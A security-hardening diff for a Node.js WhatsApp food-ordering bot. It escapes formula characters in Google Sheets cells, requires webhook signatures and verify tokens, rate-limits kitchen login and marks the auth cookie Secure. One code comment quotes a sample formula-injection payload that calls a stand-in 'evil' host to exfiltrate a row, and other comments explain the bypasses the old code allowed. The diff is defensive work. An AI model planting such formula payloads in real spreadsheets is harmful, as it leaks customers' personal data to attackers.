@@ -499,7 +499,7 @@ async function logOrderToSheets(orderNumber, session, from) {
         spreadsheetId: process.env.GOOGLE_SHEETS_ID,
         range: `Manager!A${managerNextRow}:H${managerNextRow}`,
         valueInputOption: 'USER_ENTERED',
-        requestBody: { values: [[orderNumber, timestamp, itemsWithPrice, total, modeText, session.language, phoneForSheet, 'Confirmed']] },
+        requestBody: { values: [[orderNumber, timestamp, sheetSafe(itemsWithPrice), total, sheetSafe(modeText), session.language, phoneForSheet, 'Confirmed']] },
       }), 6000);
 
       const kitchenRows = await withTimeout(sheets.spreadsheets.values.get({
@@ -512,7 +512,7 @@ async function logOrderToSheets(orderNumber, session, from) {
         spreadsheetId: process.env.GOOGLE_SHEETS_ID,
         range: `Kitchen!A${kitchenNextRow}:D${kitchenNextRow}`,
         valueInputOption: 'USER_ENTERED',
-        requestBody: { values: [[orderNumber, timestamp, itemsNoPrice, modeText]] },
+        requestBody: { values: [[orderNumber, timestamp, sheetSafe(itemsNoPrice), sheetSafe(modeText)]] },
       }), 6000);
 
       console.log(`Order #${orderNumber} logged to Sheets ✅ (Manager row ${managerNextRow}, Kitchen row ${kitchenNextRow})`);
@@ -532,6 +532,18 @@ async function logOrderToSheets(orderNumber, session, from) {
     // not just a log line nobody's watching.
     alertOwner(`sheets-log-${orderNumber}`, `Order #${orderNumber} was confirmed to the customer but FAILED to log to the Manager/Kitchen sheet: ${err.message || err}`);
   }
+}
+
+// Google Sheets evaluates any cell whose value STARTS with one of these as a
+// formula. Customer-typed values (delivery address, preference notes) land in
+// cells of their own, so a saved address of `=IMAGE("https://evil/"&A2)` runs
+// the moment staff open the Customers tab — quietly handing that row to
+// whoever typed it. A leading apostrophe forces Sheets to treat the value as
+// text and is not itself displayed. Same trick the phone column already used;
+// this generalises it to every user-derived cell.
+function sheetSafe(value) {
+  const s = String(value == null ? '' : value);
+  return /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
 }
 
 // Strips a Sheets phone cell (e.g. "'+50161234567") down to bare digits for
@@ -692,7 +704,15 @@ const CHAKRA_WEBHOOK_SECRET = process.env.CHAKRA_WEBHOOK_SECRET;
 
 function verifyChakraSignature(req) {
   const signature = req.get('X-Chakra-Signature-256');
-  if (!CHAKRA_WEBHOOK_SECRET || !signature || !req.rawBody) return null; // nothing to check against
+  // No secret configured — this deployment has opted out of verification.
+  if (!CHAKRA_WEBHOOK_SECRET) return null;
+  // A secret IS configured, so an unsigned request is a REJECTION, not an
+  // "unable to check". Returning null here used to mean an attacker could
+  // bypass HMAC verification completely by simply omitting the header — and
+  // since isOwner() trusts the `from` in the payload, that let anyone who
+  // found the URL send owner commands (pause orders, soldout, queue, stats)
+  // and place orders as any customer straight into the Manager sheet.
+  if (!signature || !req.rawBody) return false;
   const expected = crypto.createHmac('sha256', CHAKRA_WEBHOOK_SECRET).update(req.rawBody).digest('hex');
   const expectedBuf = Buffer.from(expected, 'utf8');
   const gotBuf = Buffer.from(signature, 'utf8');
@@ -730,6 +750,15 @@ function isRateLimited(key, { max, windowMs }) {
     return false;
   }
   bucket.count++;
+  return bucket.count > max;
+}
+
+// Read-only companion to isRateLimited: reports whether a key is already over
+// its ceiling WITHOUT recording another hit. Lets a caller block first and
+// count only the attempts it actually wants to penalise.
+function isOverLimit(key, { max, windowMs }) {
+  const bucket = rateBuckets.get(key);
+  if (!bucket || Date.now() - bucket.windowStart >= windowMs) return false;
   return bucket.count > max;
 }
 
@@ -1116,7 +1145,7 @@ async function saveCustomerProfile(from, fields) {
     }), 8000);
     const rows = res.data.values || [];
     const rowIndex = rows.findIndex(r => normalizePhoneDigits(r[0]) === String(from));
-    const rowValues = [`'+${from}`, merged.savedAddress || '', merged.notes || '', merged.updatedAt];
+    const rowValues = [`'+${from}`, sheetSafe(merged.savedAddress), sheetSafe(merged.notes), merged.updatedAt];
     const rowNum = rowIndex >= 0 ? rowIndex + 2 : rows.length + 2; // +2: range starts at row 2 (header is row 1)
     await withTimeout(sheets.spreadsheets.values.update({
       spreadsheetId: process.env.GOOGLE_SHEETS_ID,
@@ -4065,12 +4094,19 @@ async function processWhatsAppMessage(message, res) {
 // only the raw Meta pass-through does). Set WEBHOOK_VERIFY_TOKEN in .env to
 // whatever you enter in the dashboard's verify-token field.
 app.get('/whatsapp', (req, res) => {
+  const expected = process.env.WEBHOOK_VERIFY_TOKEN;
+  // With the env var unset this endpoint used to verify ANY caller: a request
+  // carrying no hub.verify_token made the comparison `undefined === undefined`,
+  // which is true, and the challenge was handed straight back. Require the
+  // token to actually be configured before this can ever succeed.
+  if (!expected) return res.sendStatus(403);
   const mode = req.query['hub.mode'];
   const token = req.query['hub.verify_token'];
-  const challenge = req.query['hub.challenge'];
 
-  if (mode === 'subscribe' && token === process.env.WEBHOOK_VERIFY_TOKEN) {
-    return res.status(200).send(challenge);
+  if (mode === 'subscribe' && typeof token === 'string' &&
+      Buffer.byteLength(token) === Buffer.byteLength(expected) &&
+      crypto.timingSafeEqual(Buffer.from(token), Buffer.from(expected))) {
+    return res.status(200).send(req.query['hub.challenge']);
   }
   res.sendStatus(403);
 });
@@ -4093,6 +4129,10 @@ app.get('/', (req, res) => {
 // to serve rather than defaulting to public.
 const KITCHEN_STATUSES = ['Preparing', 'Ready for Pickup', 'Out for Delivery', 'Completed', 'Cancelled'];
 const KITCHEN_COOKIE = 'kitchen_auth';
+const KITCHEN_LOGIN_KEY = '__kitchen_login__';
+// 10 wrong guesses per 15 minutes, shared across all clients. Useless for a
+// real attacker against a long random KITCHEN_PASSWORD; invisible to staff.
+const KITCHEN_LOGIN_LIMIT = { max: 10, windowMs: 15 * 60 * 1000 };
 
 function kitchenPasswordHash() {
   return crypto.createHash('sha256').update(String(process.env.KITCHEN_PASSWORD || '')).digest('hex');
@@ -4125,14 +4165,28 @@ function requireKitchenAuth(req, res) {
 
 app.post('/kitchen/login', (req, res) => {
   if (!process.env.KITCHEN_PASSWORD) return res.status(503).json({ error: 'not configured' });
+  // Guessing ceiling. Global rather than per-IP on purpose: behind Railway's
+  // proxy the only per-client signal is X-Forwarded-For, which the client
+  // itself sets — limiting on it would let an attacker mint a fresh bucket
+  // per request and defeat the limit entirely. Staff authenticate once per
+  // device per year, so a shared ceiling costs them nothing. Only FAILED
+  // attempts count (see below), so a full kitchen signing in is never
+  // throttled.
+  if (isOverLimit(KITCHEN_LOGIN_KEY, KITCHEN_LOGIN_LIMIT)) {
+    return res.status(429).json({ error: 'Too many attempts — wait a few minutes and try again.' });
+  }
   const supplied = String((req.body && req.body.password) || '');
   const a = Buffer.from(crypto.createHash('sha256').update(supplied).digest('hex'));
   const b = Buffer.from(kitchenPasswordHash());
   if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) {
+    isRateLimited(KITCHEN_LOGIN_KEY, KITCHEN_LOGIN_LIMIT); // count failures only
     return res.status(401).json({ error: 'wrong password' });
   }
   // 1 year — the whole point is that staff authenticate once per device.
-  res.setHeader('Set-Cookie', `${KITCHEN_COOKIE}=${kitchenPasswordHash()}; Max-Age=31536000; Path=/kitchen; HttpOnly; SameSite=Lax`);
+  // Secure: this cookie is a bearer token for customer PII, so never let it
+  // travel over plain HTTP. Browsers treat localhost as a secure origin, so
+  // local development still works.
+  res.setHeader('Set-Cookie', `${KITCHEN_COOKIE}=${kitchenPasswordHash()}; Max-Age=31536000; Path=/kitchen; HttpOnly; Secure; SameSite=Lax`);
   res.json({ ok: true });
 });
 
